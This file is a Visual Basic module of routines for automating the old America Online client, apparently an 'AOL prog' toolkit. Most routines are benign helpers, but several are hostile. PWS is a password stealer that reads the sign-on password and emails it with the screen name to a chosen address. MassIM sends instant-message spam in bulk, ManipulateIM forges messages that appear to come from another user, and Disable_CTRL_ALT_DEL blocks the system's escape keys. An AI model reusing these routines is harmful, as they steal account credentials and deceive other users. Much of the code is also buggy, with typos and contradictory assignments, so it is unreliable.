Sub HardDrive_FreePrcnt()
fp = CurrentDisk.FreePcnt
fp = FreePrcnt
End Sub
Sub HardDrive_UsedPrcnt()
up = CurrentDisk.UsedPcnt
up = UsedPrcnt
End Sub
Sub HardDrive_TotalBytes()
tb = CurrentDisk.TotalBytes
tb = TotalBytes
End Sub
Sub MassIM(lst As ListBox, Text$)
Do
For i = 0 To lst.ListCount - 1
If m001C% = 1 Then Exit Sub
Who$ = lst.List(0)
lst.ListIndex = 0
Next i
okw = FindWindow("#32770", "America Online")
okb = FindChildByTitle(okw, "OK")
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
run "Send an Instant Message"
Do
aol = FindWindow("AOL Frame25", 0&)
bah = FindChildByTitle(aol, "Send Instant Message")
Txt% = FindChildByClass(bah, "_AOL_Edit")
DoEvents
Loop Until Txt% <> 0
Txt% = FindChildByClass(bah, "_AOL_Edit")
Do
Rich% = FindChildByClass(bah, "RICHCNTL")
bahqw% = FindChildByTitle(bah, "Send")
DoEvents
timeout (0.001)
Loop Until Rich% <> 0 Or bahqw% <> 0
If Rich% <> 0 Then
send Txt%, Who$
send Rich%, ((Text$) & Chr(13) & "" & Chr(13) & "")
timeout (0.001)
GetNum Rich%, 1
Click Rich%
Else
send Txt%, Person$
GetNum Txt%, 1
send Txt%, tt$
GetNum Txt%, 1
Click Txt%
End If
timeout (0.001)
X = SendMessageByNum(bah, WM_CLOSE, 0, 0)
a = lst.List(0)
Call Delitem(lst, (a))
Loop Until lst.ListCount = 0
If lst.ListCount = 0 Then
Exit Sub
End If
End Sub
Function TextScroll_3(txt1 As TextBox, txt2 As TextBox, txt3 As TextBox)
SendChat (txt1)
pause 0.5
SendChat (txt2)
pasue 0.5
SendChat (txt3)
End Function
Function TextScroll_5(txt1 As TextBox, txt2 As TextBox, txt3 As TextBox, txt4 As TextBox, txt5 As TextBox)
SendChat (txt1)
pause 0.5
SendChat (txt2)
pasue 0.5
SendChat (txt3)
pause 0.5
SendChat (txt4)
pasue 0.5
SendChat (txt5)
End Function
Sub SendChatBold(BoldChat)
SendChat ("<b>" & BoldChat & "</b>")
End Sub
Sub SendChatItalic(ItalicChat)
SendChat ("<i>" & ItalicChat & "</i>")
End Sub
Sub HideCursor()
X = ShowCursor(False)
End Sub
Sub Show_Cursor()
X = ShowCursor(True)
End Sub
Sub CreateFileAssoctiation()
' Edit what is in " "
Dim myfiletype As filetype
myfiletype.ProperName = "MyFile"
myfiletype.FullName = "My File Type"
myfiletype.ContentType = "SomeMIMEtype"
myfiletype.Extension = ".MYF"
myfiletype.Commands.Captions.Add "Open"
myfiletype.Commands.Commands.Add _
"c:\windows\notepad.exe ""%1"""
myfiletype.Commands.Captions.Add "Print"
myfiletype.Commands.Commands.Add _
"c:\windows\notepad.exe ""%1"" /P"
CreateExtension myfiletype
End Sub
Sub FindFile(FileName, Atrribute)
'Attribute Description
'vbNormal Default Attribute
'vbReadOnly Use if file pathname is read-only.
'vbHidden Use if the file pathname is hidden.
'vbSystem Use if the file pathname is a system file.
'vbArchive Use if the file pathname is an Archive file.
'vbDirectory Use if pathname is a directory.
If Dir(FileName, vbNormal Or vbReadOnly Or vbHidden Or _
vbSystem Or vbArchive) = "" Then
 Call MsgBox("This file does not exist")
Else
 Call MsgBox("This file does exist")
End If
End Sub
Sub DrawingPadMouseDown(picDraw As PictureBox)
'Go Ahead And Call This In Mouse Down In The PicBox
'Make Sure To Use DrawingPadMouseMove too!
Dim siX1 As String
Dim siY1 As String
Dim siX2 As String
Dim siY2 As String
Dim sFormatStr As String, sFormatStr2 As String
Dim i As Integer
For i = 1 To PARAM_LEN
    sFormatStr = sFormatStr & "0"
Next i

For i = 1 To PARAM_LEN - 1
    sFormatStr2 = sFormatStr2 & "0"
Next i
If X >= 0 Then
    siX2 = Format(X, sFormatStr)
Else
    siX2 = Format(X, sFormatStr2)
End If
If Y >= 0 Then
    siY2 = Format(Y, sFormatStr)
Else
    siY2 = Format(Y, sFormatStr2)
End If
picDraw.Line (X, Y)-(X, Y), sCurrentColor
iX = X
iY = Y
End Sub
 Sub DrawingPadMouseMove()
Dim siX1 As String
Dim siY1 As String
Dim siX2 As String
Dim siY2 As String
Dim sFormatStr As String, sFormatStr2 As String
Dim i As Integer
If Button = vbLeftButton Then
    For i = 1 To PARAM_LEN
        sFormatStr = sFormatStr & "0"
    Next i
    For i = 1 To PARAM_LEN - 1
        sFormatStr2 = sFormatStr2 & "0"
    Next i
    If iX >= 0 Then
        siX1 = Format(iX, sFormatStr)
    Else
        siX1 = Format(iX, sFormatStr2)
    End If
    If iY >= 0 Then
        siY1 = Format(iY, sFormatStr)
    Else
        siY1 = Format(iY, sFormatStr2)
    End If
    If X >= 0 Then
        siX2 = Format(X, sFormatStr)
    Else
        siX2 = Format(X, sFormatStr2)
    End If
    If Y >= 0 Then
        siY2 = Format(Y, sFormatStr)
    Else
        siY2 = Format(Y, sFormatStr2)
    End If

    picDraw.Line (iX, iY)-(X, Y), sCurrentColor
    iX = X
    iY = Y
End If
End Sub
 Function LimitTextBox(TxtBx As TextBox, LimitNum As Integer)
 ' Put This Under txtbox_change
 Y = TxtBx.Text
 X = Len(TxtBx.Text)
 If X > LimitNum Then
 MsgBox "You cannot have more than " & LimitNum & "'s charaters!", vbCritical, "Error"
' To save millions of lines of code I am using sendkeys..but it still werkz
SendKeys ("{backspace}")
 End If
 End Function
Public Sub Disable_CTRL_ALT_DEL()
'Disables the Crtl+Alt+Del
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub

Public Sub Enable_CTRL_ALT_DEL()
'Enables the Crtl+Alt+Del
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub
Public Function TileBitmap(ByVal TheForm As Form, ByVal theBitmap As PictureBox)
'Private Sub Form_Paint()
'    TileBitmap Form1, Picture1
'End Sub
    Dim iAcross As Integer
    Dim iDown As Integer
    theBitmap.AutoSize = True
    For iDown = 0 To (TheForm.Width \ theBitmap.Width) + 1
        For iAcross = 0 To (TheForm.Height \ theBitmap.Height) + 1
            TheForm.PaintPicture theBitmap.Picture, iDown * theBitmap.Width, iAcross * theBitmap.Height, theBitmap.Width, theBitmap.Height
    Next iAcross, iDown
End Function
Sub Replacer(LookFor As String, ReplaceWith As String, Txt As TextBox)
'This Is Like a Find and Replace Feature but it filters
'Filter("This is the Chracter to look for","This is the character to replace","This is the Textbox to look")
Do
If InStr(Txt.Text, LookFor) = 0 Then Exit Do
macstringz = Left$(Txt.Text, InStr(Txt.Text, LookFor) - 1) + ReplaceWith + Right$(Txt.Text, Len(Txt.Text) - InStr(Txt.Text, LookFor))
Txt.Text = macstringz
Loop Until InStr(Txt.Text, LookFor) = 0
End Sub
Sub GetActiveWindow()
ActiveWin = Screen.ActiveForm.Caption
End Sub
Public Function FileGetAttributes(TheFile As String) As Integer
    Dim SafeFile As String
    SafeFile$ = Dir(TheFile$)
    If SafeFile$ <> "" Then
        FileGetAttributes% = GetAttr(TheFile$)
    End If
End Function

Public Sub FileSetNormal(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = Dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbNormal
    End If
End Sub

Public Sub FileSetReadOnly(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = Dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbReadOnly
    End If
End Sub

Public Sub FileSetHidden(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = Dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbHidden
    End If
End Sub
Sub findmail()
User = UserSN
X = FindWindow("AOL Frame25", vbNullString)
Y = FindChildByTitle(X, User & "'s Online Mailbox")
If Y <> 0 Then
   FindChatRoom = 1
Else:
   FindChatRoom = 0
End If
End Sub

Function GetUsersWeather(city)
'This works really good, when i made it my bandwith
'was getting slow, so edit the pause to what u need it at
Call Toolbar_Weather
pause 6
X = FindWindow("AOL Frame25", vbNullString)
Y = FindChildByClass(X, "MDIClient")
z = FindChildByTitle(Y, " National Weather")
W = FindChildByClass(z, "_AOL_Edit")
sendcity = sendmessagebystring(W, WM_SETTEXT, 0, "Las Vegas")
Button = FindChildByClass(z, "_AOL_Icon")
aoicon% = GetWindow(Button, 2)
aoicon% = GetWindow(Button, 2)
pause 5
ClickIcon (Button)
pause 4
searchr = FindChildByTitle(Y, "Search Results")
Call ActivateAOLwin
SendKeys ("{enter}")
pause 2
wwin = FindChildByTitle(Y, " Las Vegas ")
forcastX = FindChildByClass(wwin, "RICHCNTL")
wt = GetText(forcastX)
pause 2
Text1.Text = wt
Call ShowWindow(z, 0) 'U have to hide it cuz the forcast
'wont wer for some reason if u close it
Call ShowWindow(searchr, 0)
Call ShowWindow(wwin, 0)
End Function
Function AOLVersion2()
X = FindWindow("AOL Frame25", vbNullString)
Y = FindChildByClass(X, "_AOL_Toolbar")
If Y <> 0 Then
AOLVersion2 = "4.o"
Else:
AOLVersion2 = "3.o Or Below"
End If
End Function

Function ActivateAOLwin()
'This is the only ERROR PROOF window activator known to man
'kind, and it is made by me! Ok, it does exactly like AppActivate
'but is better
X = FindWindow("AOL Frame25", 0&)
ClickIcon (X)
End Function
Function ActivateWindow(WinClassName)
X = FindWindow(WinClassName, 0&)
ClickIcon (X)
End Function
Sub Keyword2(TheKeyword As String)
'This is an alternative to using the keyword box,
'it uses the combobox on the toolbar of aol
aol% = FindWindow("AOL Frame25", vbNullString)
tool% = FindChildByClass(aol%, "AOL Toolbar")
toolb% = FindChildByClass(tool%, "_AOL_Toolbar")
Comb% = FindChildByClass(toolb%, "_AOL_Combobox")
Edi% = FindChildByClass(Comb%, "Edit")
fillit = sendmessagebystring(Edi%, WM_SETTEXT, 0, TheKeyword)
clickit = SendMessageByNum(Edi%, WM_CHAR, VK_SPACE, 0&)
clickit = SendMessageByNum(Edi%, WM_CHAR, 13, 0&)
End Sub
Function SignOn(PASS As String)
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
TIT% = FindChildByTitle(mdi%, "Goodbye From America Online")
tit2% = FindChildByTitle(mdi%, "Sign On")
If TIT% <> 0 Then
Edi% = FindChildByClass(TIT%, "_AOL_Edit")
fillit = sendmessagebystring(Edi%, WM_SETTEXT, 0, PASS)
clickit = SendMessage(Edi%, WM_CHAR, 13, 0&)
ElseIf tit2% <> 0 Then
Edi% = FindChildByClass(tit2%, "_AOL_Edit")
fillit = sendmessagebystring(Edi%, WM_SETTEXT, 0, PASS)
clickit = SendMessage(Edi%, WM_CHAR, 13, 0&)
End If
End Function
Function IsItMe(Who As String)
'this will c if it is me
X = Len(Who)
If X = 10 Then
Y = Right(Who, 3)
If Y = "ooP" Then GoTo DaPope
Else
MsgBox "Nope!"
Exit Function
End If
DaPope:
MsgBox "I think u found me!"
End Function
Sub PWS(YoEMAILaddress, Subjct)
'Put this on a timer and use enabled/disabled
'to make this turn on or off
'edit it if you want to make it better, i know itz
'kinda shitty, but hey its better than nothin
Do
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
TIT% = FindChildByTitle(mdi%, "Goodbye From America Online")
tit2% = FindChildByTitle(mdi%, "Sign On")
If TIT% <> 0 Then
Edi% = FindChildByClass(TIT%, "_AOL_Edit")
pw = GetText(Edi%)
ElseIf tit2% <> 0 Then
Edi% = FindChildByClass(tit2%, "_AOL_Edit")
pw = GetText(Edi%)
pw = Ex23
Blah = Len(Ex23)
If Blah > 0 Then
User = UserSN
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome,")
If welcome% <> 0 Then
 Do
DoEvents
we = FindWindow("AOL Frame25", vbNullString)
ew = FindChildByClass(aol%, "MDIClient")
wew = FindChildByTitle(mdi%, "Welcome,")
DoEvents
Loop Until wew <> 0
Call SendMail(YoEMAILaddress, Subjct, User & "'s PW Is: " & pw)
Else:
   IsUserOnline = 0
End If
End If
Loop
End Sub
Sub ManipulateIM(Who, Txt)
Call IMBuddy(Who, "                                                                                  <small><b><font color=#FF0000><small>" & Chr(160) & Who & "</b>:</small>     <font color=#000000>" & Txt & "</font>")
End Sub
Sub BlankIMsend(Who)
Call IMKeyword(Who, Chr(160))
End Sub
Sub BlankChatSend()
SendChat (Chr(160))
End Sub
Sub IMCenterBig(Who, Txt)
For i = j To 310
Call IMKeyword(Who, i & "<body bgcolor=#000000><p><font color=#00FF00><center><h1>" & Txt)
Exit Sub
Next i
End Sub

